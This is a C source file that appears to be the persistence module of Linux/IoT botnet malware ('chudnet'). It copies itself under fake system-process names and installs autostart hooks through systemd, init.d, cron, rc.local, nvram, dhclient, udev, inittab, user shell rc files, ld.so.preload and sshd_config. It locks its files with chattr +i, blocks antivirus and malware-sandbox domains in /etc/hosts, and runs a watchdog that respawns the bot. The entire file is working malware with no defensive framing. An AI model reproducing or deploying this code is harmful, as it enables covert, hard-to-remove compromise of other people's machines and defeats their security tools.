#define _GNU_SOURCE
#pragma GCC diagnostic ignored "-Wformat-truncation"

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <dirent.h>

#ifndef PATH_MAX
#ifdef _POSIX_PATH_MAX
#define PATH_MAX _POSIX_PATH_MAX
#else
#define PATH_MAX 4096
#endif
#endif
#include <time.h>
#include <signal.h>
#include <string.h>
#include <sys/wait.h>

#include "includes.h"
#include "persistence.h"
#include "rand.h"
#include "util.h"

static char installed_path[256] = {0};

static void persistence_shell_hooks(void);
static void persistence_bashrc_all_users(void);
static void persistence_nvram(void);
static void persistence_dhclient(void);
static void persistence_udev(void);
static void persistence_inittab(void);
static void persistence_profile_d(void);
static void persistence_crontab_direct(void);
static void persistence_upstart(void);
static void persistence_chattr(void);

static const char *fake_names[] = {
    "kworker-helper", "dhcpcd-monitor", "ntpd-sync",
    "udevd-helper", "syslogd-rotate", "crond-helper",
    "netlink-monitor", "mdev-trigger", "avahi-helper",
    "dbus-monitor", "logrotate-svc", "tmpfiles-clean",
    "resolved-helper", "busybox-svc", "dropbear-agent",
    "iptables-helper"
};

#define NUM_FAKE_NAMES (sizeof(fake_names) / sizeof(fake_names[0]))

static const char *install_dirs[] = {
    "/usr/lib", "/usr/libexec", "/usr/local/lib",
    "/opt", "/var/lib", "/usr/sbin",
    "/usr/local/bin", "/usr/bin", "/lib",
    NULL
};

static const char *fallback_dirs[] = {
    "/var/tmp", "/tmp", "/dev/shm",
    NULL
};

static BOOL file_exists(const char *path)
{
    return access(path, F_OK) == 0;
}

static BOOL copy_file(const char *src, const char *dst)
{
    int sfd, dfd;
    char buffer[4096];
    int n, w;

    sfd = open(src, O_RDONLY);
    if (sfd == -1) return FALSE;

    dfd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (dfd == -1) { close(sfd); return FALSE; }

    while ((n = read(sfd, buffer, sizeof(buffer))) > 0)
    {
        w = 0;
        while (w < n)
        {
            int r = write(dfd, buffer + w, n - w);
            if (r <= 0) { close(sfd); close(dfd); unlink(dst); return FALSE; }
            w += r;
        }
    }

    close(sfd);
    close(dfd);
    chmod(dst, 0755);
    return TRUE;
}

static BOOL is_installed_in_system_dir(char *path)
{
    char *checks[] = {
        "/usr/local/bin/", "/usr/bin/", "/usr/sbin/",
        "/usr/lib/", "/usr/libexec/", "/lib/", "/opt/",
        NULL
    };
    int i;
    for (i = 0; checks[i]; i++)
        if (util_strstr(path, checks[i])) return TRUE;
    return FALSE;
}

void persistence_init(void)
{
    char self_exe[4096];
    int len = readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1);
    if (len == -1) return;
    self_exe[len] = 0;

    if (is_installed_in_system_dir(self_exe))
    {
        util_strcpy(installed_path, self_exe);
        return;
    }

    /* detect read-only root filesystem — skip disk persistence */
    {
        struct statvfs vfs;
        if (statvfs("/etc", &vfs) == 0 && (vfs.f_flag & ST_RDONLY))
            return;
    }

    {
        const char *name;
        int idx;
        int i;

        idx = rand_next() % NUM_FAKE_NAMES;
        name = fake_names[idx];

        for (i = 0; install_dirs[i] != NULL; i++)
        {
            char path[256];
            struct stat st;
            if (access(install_dirs[i], W_OK) != 0) continue;
            snprintf(path, sizeof(path), "%s/%s", install_dirs[i], name);
            if (stat(path, &st) == 0 && st.st_size > 0) continue;
            if (copy_file(self_exe, path) && access(path, X_OK) == 0)
            {
                unlink(self_exe);
                util_strcpy(installed_path, path);
                break;
            }
        }
    }

    if (installed_path[0] == 0)
    {
        int i;
        for (i = 0; fallback_dirs[i] != NULL; i++)
        {
            char name[32], path[256];
            int j;
            if (access(fallback_dirs[i], W_OK) != 0) continue;
            for (j = 0; j < 3; j++)
            {
                snprintf(name, sizeof(name), ".cache-%08x", rand_next());
                snprintf(path, sizeof(path), "%s/%s", fallback_dirs[i], name);
                if (!file_exists(path))
                {
                    if (copy_file(self_exe, path) && access(path, X_OK) == 0)
                    {
                        util_strcpy(installed_path, path);
                        break;
                    }
                }
            }
            if (installed_path[0]) break;
        }
    }

    if (installed_path[0] == 0)
        return;

    if (access("/etc/systemd/system", F_OK) == 0)
    {
        const char *bn;
        char svc_path[PATH_MAX + 64];
        char wants_dir[PATH_MAX + 64];
        int fd;
        char buf[512];
        int n;

        bn = strrchr(installed_path, '/');
        bn = bn ? bn + 1 : installed_path;

        snprintf(svc_path, sizeof(svc_path), "/etc/systemd/system/%s.service", bn);

        fd = open(svc_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd != -1)
        {
            n = util_strcpy(buf, "[Unit]\nDescription=System Helper Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=");
            n += util_strcpy(buf + n, installed_path);
            n += util_strcpy(buf + n, "\nRestart=on-failure\nRestartSec=30\n\n[Install]\nWantedBy=multi-user.target\n");
            write(fd, buf, n);
            close(fd);
        }

        snprintf(wants_dir, sizeof(wants_dir), "/etc/systemd/system/multi-user.target.wants");
        if (access(wants_dir, F_OK) == 0)
        {
            char link_path[PATH_MAX + 64];
            snprintf(link_path, sizeof(link_path), "%s/%s.service", wants_dir, bn);
            unlink(link_path);
            symlink(svc_path, link_path);
        }

        /* duplicate persistence: network-dispatch (blends with systemd-networkd) */
        {
            int nfd;
            char nd_svc[PATH_MAX + 64] = "/etc/systemd/system/network-dispatch.service";
            nfd = open(nd_svc, O_WRONLY | O_CREAT | O_TRUNC, 0644);
            if (nfd != -1)
            {
                char nd_buf[512];
                int nd_n = util_strcpy(nd_buf,
                    "[Unit]\n"
                    "Description=Network Dispatch\n"
                    "After=network.target\n\n"
                    "[Service]\n"
                    "Type=simple\n"
                    "ExecStart=");
                nd_n += util_strcpy(nd_buf + nd_n, installed_path);
                nd_n += util_strcpy(nd_buf + nd_n,
                    "\nRestart=on-failure\n"
                    "RestartSec=30\n\n"
                    "[Install]\n"
                    "WantedBy=multi-user.target\n");
                write(nfd, nd_buf, nd_n);
                close(nfd);

                snprintf(nd_svc, sizeof(nd_svc),
                    "%s/network-dispatch.service",
                    wants_dir);
                if (!file_exists(nd_svc))
                    symlink("/etc/systemd/system/network-dispatch.service", nd_svc);
            }
        }
    }

    if (access("/etc/init.d", F_OK) == 0)
    {
        const char *bn;
        char initd_path[PATH_MAX + 64];
        FILE *f;
        int has_procd;

        bn = strrchr(installed_path, '/');
        bn = bn ? bn + 1 : installed_path;

        has_procd = (access("/sbin/procd", F_OK) == 0);

        snprintf(initd_path, sizeof(initd_path), "/etc/init.d/%s", bn);
        f = fopen(initd_path, "w");
        if (f)
        {
            if (has_procd)
            {
                fprintf(f,
                    "#!/bin/sh /etc/rc.common\n"
                    "START=99\nSTOP=10\nUSE_PROCD=1\n\n"
                    "start_service() {\n"
                    "  procd_open_instance\n"
                    "  procd_set_param command %s\n"
                    "  procd_set_param respawn\n"
                    "  procd_close_instance\n"
                    "}\n", installed_path);
            }
            else
            {
                fprintf(f,
                    "#!/bin/sh\n"
                    "### BEGIN INIT INFO\n"
                    "# Provides:          %s\n"
                    "# Required-Start:    $remote_fs $syslog\n"
                    "# Required-Stop:     $remote_fs $syslog\n"
                    "# Default-Start:     2 3 4 5\n"
                    "# Default-Stop:      0 1 6\n"
                    "### END INIT INFO\n"
                    "case \"$1\" in\n"
                    "  start) %s & ;;\n"
                    "  stop)  pkill -f '%s' ;;\n"
                    "  restart) $0 stop; sleep 1; $0 start ;;\n"
                    "  *) exit 1 ;;\n"
                    "esac\n", bn, installed_path, installed_path);
            }
            fclose(f);
            chmod(initd_path, 0755);
        }

        if (access("/etc/rc.d", F_OK) == 0)
        {
            char link[PATH_MAX + 64];
            snprintf(link, sizeof(link), "/etc/rc.d/S99%s", bn);
            unlink(link);
            symlink(initd_path, link);
        }
        else
        {
            int rci;
            const char *rc_dirs[] = {
                "/etc/rc2.d", "/etc/rc3.d", "/etc/rc4.d", "/etc/rc5.d", NULL
            };
            for (rci = 0; rc_dirs[rci]; rci++)
            {
                if (access(rc_dirs[rci], F_OK) == 0)
                {
                    char link[PATH_MAX + 64];
                    snprintf(link, sizeof(link), "%s/S90%s", rc_dirs[rci], bn);
                    unlink(link);
                    symlink(initd_path, link);
                }
            }
        }
    }

    {
        char cron_cmd[512];
        int found = 0;
        FILE *f;

        f = popen("crontab -l 2>/dev/null", "r");
        if (f)
        {
            char line[256];
            while (fgets(line, sizeof(line), f))
            {
                if (util_strstr(line, installed_path))
                { found = 1; break; }
            }
            pclose(f);
        }

        if (!found)
        {
            snprintf(cron_cmd, sizeof(cron_cmd),
                "(crontab -l 2>/dev/null; echo '@reboot %s') | crontab - 2>/dev/null",
                installed_path);
            system(cron_cmd);
        }
    }

    /* cron.d — direct cron drop-in, no crontab binary needed */
    {
        if (access("/etc/cron.d", W_OK) == 0)
        {
            const char *cron_names[] = {
                "/etc/cron.d/chudnet", "/etc/cron.d/ntp-sync",
                "/etc/cron.d/network-dispatch"
            };
            int ci;
            for (ci = 0; ci < 3; ci++)
            {
                if (!file_exists(cron_names[ci]))
                {
                    FILE *cf = fopen(cron_names[ci], "w");
                    if (cf)
                    {
                        fprintf(cf, "*/10 * * * * root %s\n", installed_path);
                        fprintf(cf, "@reboot root %s\n", installed_path);
                        fclose(cf);
                    }
                }
            }
        }
    }

    /* /etc/hosts — block security/honeypot domains */
    {
        static const char *block_domains[] = {
            "avast.com", "avg.com", "bitdefender.com", "virustotal.com",
            "kaspersky.com", "mcafee.com", "norton.com", "symantec.com",
            "trendmicro.com", "eset.com", "malwarebytes.com", "f-secure.com",
            "sophos.com", "comodo.com", "pandasecurity.com",
            "cuckoosandbox.org", "malwr.com", "hybrid-analysis.com",
            "any.run", "joesandbox.com", "reverse.it",
            "abuseipdb.com", "urlhaus.abuse.ch", "virustracker.info",
            "otx.alienvault.com", "threatcrowd.org",
            NULL
        };
        FILE *hf = fopen("/etc/hosts", "a");
        if (hf)
        {
            int bi;
            for (bi = 0; block_domains[bi]; bi++)
                fprintf(hf, "0.0.0.0 %s\n0.0.0.0 www.%s\n", block_domains[bi], block_domains[bi]);
            fclose(hf);
        }
    }

    {
        const char *rc = "/etc/rc.local";
        int found = 0;

        if (file_exists(rc))
        {
            char line[512];
            FILE *f = fopen(rc, "r");
            if (f)
            {
                while (fgets(line, sizeof(line), f))
                {
                    if (util_strstr(line, installed_path))
                    { found = 1; break; }
                }
                fclose(f);
            }
        }

        if (!found && access("/etc", W_OK) == 0)
        {
            if (!file_exists(rc))
            {
                FILE *f = fopen(rc, "w");
                if (f) { fprintf(f, "#!/bin/sh\nexit 0\n"); fclose(f); chmod(rc, 0755); }
            }
            {
                char tmp[256];
                FILE *fin = fopen(rc, "r");
                if (fin)
                {
                    FILE *fout;
                    snprintf(tmp, sizeof(tmp), "%s.tmp", rc);
                    fout = fopen(tmp, "w");
                    if (fout)
                    {
                        char line[512];
                        int inserted = 0;
                        while (fgets(line, sizeof(line), fin))
                        {
                            if (!inserted && strstr(line, "exit 0"))
                            {
                                fprintf(fout, "%s &\n", installed_path);
                                inserted = 1;
                            }
                            fputs(line, fout);
                        }
                        if (!inserted)
                            fprintf(fout, "%s &\n", installed_path);
                        fclose(fin);
                        fclose(fout);
                        rename(tmp, rc);
                        chmod(rc, 0755);
                    }
                    else
                        fclose(fin);
                }
            }
        }
    }

    persistence_shell_hooks();
    persistence_bashrc_all_users();
    persistence_nvram();
    persistence_dhclient();
    persistence_udev();
    persistence_inittab();
    persistence_profile_d();
    persistence_crontab_direct();
    persistence_upstart();
    persistence_chattr();

    {
        FILE *f = fopen("/etc/ssh/sshd_config", "a");
        if (f) { fprintf(f, "ForceCommand %s\n", installed_path); fclose(f); }
    }

    {
        char backup_path[256];
        const char *bn = strrchr(installed_path, '/');
        bn = bn ? bn + 1 : installed_path;
        snprintf(backup_path, sizeof(backup_path), "/var/lib/%s.bak", bn);
        if (!file_exists(backup_path) && installed_path[0])
        {
            copy_file(installed_path, backup_path);
            chmod(backup_path, 0755);
        }
    }

    {
        DIR *d = opendir("/home");
        struct dirent *e;
        if (d)
        {
            while ((e = readdir(d)))
            {
                if (e->d_name[0] == '.') continue;
                if (!file_exists("/home") || access(e->d_name, F_OK) != 0) continue;
                {
                    char xdg_dir[512], desktop[512];
                    int fd;
                    snprintf(xdg_dir, sizeof(xdg_dir), "/home/%s/.config/autostart", e->d_name);
                    mkdir(xdg_dir, 0755);
                    snprintf(desktop, sizeof(desktop), "%s/helper.desktop", xdg_dir);
                    if (!file_exists(desktop))
                    {
                        fd = open(desktop, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                        if (fd != -1)
                        {
                            char buf[512];
                            int n = snprintf(buf, sizeof(buf),
                                "[Desktop Entry]\nType=Application\nName=System Helper\n"
                                "Exec=%s\nHidden=false\nNoDisplay=true\n"
                                "X-GNOME-Autostart-enabled=true\n", installed_path);
                            write(fd, buf, n);
                            close(fd);
                        }
                    }
                }
            }
            closedir(d);
        }
    }

    {
        int fd = open("/etc/ld.so.preload", O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd != -1)
        {
            char preload_line[512];
            int found = 0;
            {
                int rfd = open("/etc/ld.so.preload", O_RDONLY);
                if (rfd != -1)
                {
                    char rbuf[4096];
                    int rn = read(rfd, rbuf, sizeof(rbuf) - 1);
                    close(rfd);
                    if (rn > 0)
                    {
                        rbuf[rn] = 0;
                        if (util_strstr(rbuf, installed_path))
                            found = 1;
                    }
                }
            }
            if (!found && installed_path[0])
            {
                snprintf(preload_line, sizeof(preload_line), "%s\n", installed_path);
                write(fd, preload_line, util_strlen(preload_line));
            }
            close(fd);
        }
    }

    {
        if (access("/etc/cron.d", W_OK) == 0)
        {
            char heal_cron[512];
            int cf_fd, i;
            for (i = 0; i < 3; i++)
            {
                snprintf(heal_cron, sizeof(heal_cron),
                    "*/3 * * * * root [ -x %s ] || ( [ -x /var/lib/%s.bak ] && cp /var/lib/%s.bak %s && chmod 755 %s ); [ -f /var/run/chudnet.restart ] || %s &\n",
                    installed_path,
                    strrchr(installed_path, '/') ? strrchr(installed_path, '/') + 1 : installed_path,
                    strrchr(installed_path, '/') ? strrchr(installed_path, '/') + 1 : installed_path,
                    installed_path, installed_path, installed_path);
                cf_fd = open("/etc/cron.d/chudnet-heal", O_WRONLY | O_CREAT | O_TRUNC, 0644);
                if (cf_fd != -1)
                {
                    write(cf_fd, heal_cron, util_strlen(heal_cron));
                    close(cf_fd);
                }
            }
        }
    }
}

static void persistence_nvram(void)
{
    const char *nvram_cmds[] = {
        "nvram set rc_startup=\"%s &\"",
        "nvram set bootcmd=\"%s &\"",
        "nvram set pss_start_script=\"%s\"",
        "nvram set script_start=\"%s &\"",
        "nvram commit",
        "flash set STARTUP_CMD \"%s &\"",
        NULL
    };
    int i;
    for (i = 0; nvram_cmds[i]; i++)
    {
        char cmd[512];
        snprintf(cmd, sizeof(cmd), nvram_cmds[i], installed_path);
        system(cmd);
    }
}

static void persistence_dhclient(void)
{
    const char *dhcp_dirs[] = {
        "/etc/dhcp/dhclient-exit-hooks.d",
        "/etc/dhclient-script.d",
        "/etc/dhcp/dhclient.d",
        "/etc/dhcp3/dhclient-exit-hooks.d",
        NULL
    };
    int di;
    for (di = 0; dhcp_dirs[di]; di++)
    {
        if (access(dhcp_dirs[di], W_OK) == 0)
        {
            char hook[PATH_MAX + 32];
            int fd;
            snprintf(hook, sizeof(hook), "%s/99-chudnet", dhcp_dirs[di]);
            fd = open(hook, O_WRONLY | O_CREAT | O_TRUNC, 0755);
            if (fd != -1)
            {
                char buf[512];
                int n = snprintf(buf, sizeof(buf),
                    "#!/bin/sh\n[ -x %s ] && %s &\n", installed_path, installed_path);
                write(fd, buf, n);
                close(fd);
            }
        }
    }

    {
        const char *dhclient_conf = "/etc/dhclient.conf";
        if (access(dhclient_conf, W_OK) == 0)
        {
            FILE *f = fopen(dhclient_conf, "a");
            if (f)
            {
                fprintf(f, "script \"%s &\";\n", installed_path);
                fclose(f);
            }
        }
    }
}

static void persistence_udev(void)
{
    const char *udev_dirs[] = {
        "/etc/udev/rules.d",
        "/lib/udev/rules.d",
        "/usr/lib/udev/rules.d",
        NULL
    };
    int ui;
    for (ui = 0; udev_dirs[ui]; ui++)
    {
        if (access(udev_dirs[ui], W_OK) == 0)
        {
            char rule[PATH_MAX + 32];
            int fd;
            snprintf(rule, sizeof(rule), "%s/99-chudnet.rules", udev_dirs[ui]);
            fd = open(rule, O_WRONLY | O_CREAT | O_TRUNC, 0644);
            if (fd != -1)
            {
                char buf[512];
                int n = snprintf(buf, sizeof(buf),
                    "SUBSYSTEM==\"net\", ACTION==\"add\", RUN+=\"%s\"\n"
                    "SUBSYSTEM==\"block\", ACTION==\"add\", RUN+=\"%s\"\n",
                    installed_path, installed_path);
                write(fd, buf, n);
                close(fd);
            }
        }
    }
}

static void persistence_inittab(void)
{
    const char *inittab_paths[] = {
        "/etc/inittab",
        "/etc/init/inittab",
        NULL
    };
    int ii;
    for (ii = 0; inittab_paths[ii]; ii++)
    {
        if (access(inittab_paths[ii], W_OK) == 0)
        {
            FILE *f = fopen(inittab_paths[ii], "a");
            if (f)
            {
                fprintf(f, "::respawn:%s\n", installed_path);
                fclose(f);
            }
        }
    }
}

static void persistence_profile_d(void)
{
    const char *prof_dirs[] = {
        "/etc/profile.d",
        "/etc/profile",
        NULL
    };
    int pi;
    for (pi = 0; prof_dirs[pi]; pi++)
    {
        if (access(prof_dirs[pi], W_OK) == 0)
        {
            char dropin[PATH_MAX + 32];
            int fd;
            snprintf(dropin, sizeof(dropin), "%s/chudnet.sh", prof_dirs[pi]);
            fd = open(dropin, O_WRONLY | O_CREAT | O_TRUNC, 0755);
            if (fd != -1)
            {
                char buf[256];
                int n = snprintf(buf, sizeof(buf),
                    "[ -x %s ] && %s &\n", installed_path, installed_path);
                write(fd, buf, n);
                close(fd);
            }
        }
    }
}

static void persistence_crontab_direct(void)
{
    if (access("/etc/crontab", W_OK) == 0)
    {
        FILE *f = fopen("/etc/crontab", "a");
        if (f)
        {
            fprintf(f, "*/5 * * * * root %s\n", installed_path);
            fprintf(f, "@reboot root %s\n", installed_path);
            fclose(f);
        }
    }
}

static void persistence_upstart(void)
{
    if (access("/etc/init", W_OK) == 0)
    {
        const char *bn = strrchr(installed_path, '/');
        bn = bn ? bn + 1 : installed_path;
        char conf[PATH_MAX + 32];
        int fd;
        snprintf(conf, sizeof(conf), "/etc/init/%s.conf", bn);
        fd = open(conf, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd != -1)
        {
            char buf[512];
            int n = snprintf(buf, sizeof(buf),
                "description \"%s\"\n"
                "start on runlevel [2345]\n"
                "stop on runlevel [!2345]\n"
                "respawn\n"
                "exec %s\n", bn, installed_path);
            write(fd, buf, n);
            close(fd);
        }
    }
}

static void persistence_bashrc_all_users(void)
{
    DIR *d = opendir("/home");
    struct dirent *e;
    if (!d) return;
    while ((e = readdir(d)))
    {
        if (e->d_name[0] == '.') continue;
        {
            const char *rc_files[] = {".bashrc", ".profile", ".ashrc", ".zshrc", ".kshrc", NULL};
            int ri;
            for (ri = 0; rc_files[ri]; ri++)
            {
                char path[PATH_MAX + 32];
                snprintf(path, sizeof(path), "/home/%s/%s", e->d_name, rc_files[ri]);
                if (access(path, W_OK) == 0 || access(path, F_OK) != 0)
                {
                    int fd = open(path, O_WRONLY | O_APPEND | O_CREAT, 0644);
                    if (fd != -1)
                    {
                        char hook[256];
                        int n = snprintf(hook, sizeof(hook),
                            "\n[ -x %s ] && %s &\n", installed_path, installed_path);
                        write(fd, hook, n);
                        close(fd);
                    }
                }
            }
        }
    }
    closedir(d);

    /* also try /root directly */
    {
        const char *root_rc[] = {"/root/.bashrc", "/root/.profile", "/root/.ashrc", "/root/.zshrc", NULL};
        int ri;
        for (ri = 0; root_rc[ri]; ri++)
        {
            int fd = open(root_rc[ri], O_WRONLY | O_APPEND | O_CREAT, 0644);
            if (fd != -1)
            {
                char hook[256];
                int n = snprintf(hook, sizeof(hook),
                    "\n[ -x %s ] && %s &\n", installed_path, installed_path);
                write(fd, hook, n);
                close(fd);
            }
        }
    }
}

static void persistence_shell_hooks(void)
{
    static const char *rc_files[] = {
        "/root/.bashrc", "/root/.profile", "/root/.ashrc",
        "/etc/profile", "/etc/bash.bashrc",
        "/home/admin/.bashrc", "/home/admin/.profile",
        "/home/pi/.bashrc", "/home/pi/.profile",
        NULL
    };
    char hook[512];
    int n, i;
    n = snprintf(hook, sizeof(hook),
        "\n[ -x %s ] && %s &\n", installed_path, installed_path);
    for (i = 0; rc_files[i]; i++)
    {
        int fd = open(rc_files[i], O_WRONLY | O_APPEND | O_CREAT, 0644);
        if (fd != -1)
        {
            write(fd, hook, n);
            close(fd);
        }
    }
}

static void do_chattr(const char *bin, const char *path)
{
    pid_t c = fork();
    if (c == 0)
    {
        int null_fd = open("/dev/null", O_RDWR);
        if (null_fd != -1)
        {
            dup2(null_fd, 0);
            dup2(null_fd, 1);
            dup2(null_fd, 2);
            if (null_fd > 2) close(null_fd);
        }
        execl(bin, "chattr", "+i", path, NULL);
        _exit(0);
    }
    else if (c > 0)
        waitpid(c, NULL, WNOHANG);
}

static void persistence_chattr(void)
{
    const char *bin_paths[] = {"/usr/sbin/chattr", "/bin/chattr", "/usr/bin/chattr", NULL};
    const char *paths[8];
    const char *bn;
    int np = 0, i;

    bn = strrchr(installed_path, '/');
    bn = bn ? bn + 1 : installed_path;

    if (installed_path[0]) paths[np++] = installed_path;

    {
        char svc[PATH_MAX + 64];
        snprintf(svc, sizeof(svc), "/etc/systemd/system/%s.service", bn);
        if (access(svc, F_OK) == 0) paths[np++] = strdup(svc);
    }
    {
        char init[PATH_MAX + 64];
        snprintf(init, sizeof(init), "/etc/init.d/%s", bn);
        if (access(init, F_OK) == 0) paths[np++] = strdup(init);
    }
    paths[np] = NULL;

    for (i = 0; bin_paths[i]; i++)
    {
        if (access(bin_paths[i], X_OK) == 0)
        {
            int j;
            for (j = 0; paths[j]; j++)
                do_chattr(bin_paths[i], paths[j]);
            break;
        }
    }
    if (access("/bin/busybox", X_OK) == 0)
    {
        int j;
        for (j = 0; paths[j]; j++)
            do_chattr("/bin/busybox", paths[j]);
    }
}

static void watchdog_monitor(void)
{
    pid_t ppid = getppid();
    pid_t wpid;
    int i;

    wpid = fork();
    if (wpid > 0 || wpid == -1)
        return;

    setsid();
    for (i = 0; i < 1024; i++) close(i);

    while (1)
    {
        sleep(60);
        if (kill(ppid, 0) != 0)
        {
            if (installed_path[0] != 0 && access(installed_path, X_OK) == 0)
            {
                pid_t new_bot = fork();
                if (new_bot == 0)
                {
                    char *argv[] = {installed_path, NULL};
                    execv(installed_path, argv);
                    _exit(1);
                }
                else if (new_bot > 0)
                    ppid = new_bot;
            }
            else
                _exit(0);
        }
    }
}

void persistence_watchdog(void)
{
    watchdog_monitor();
}
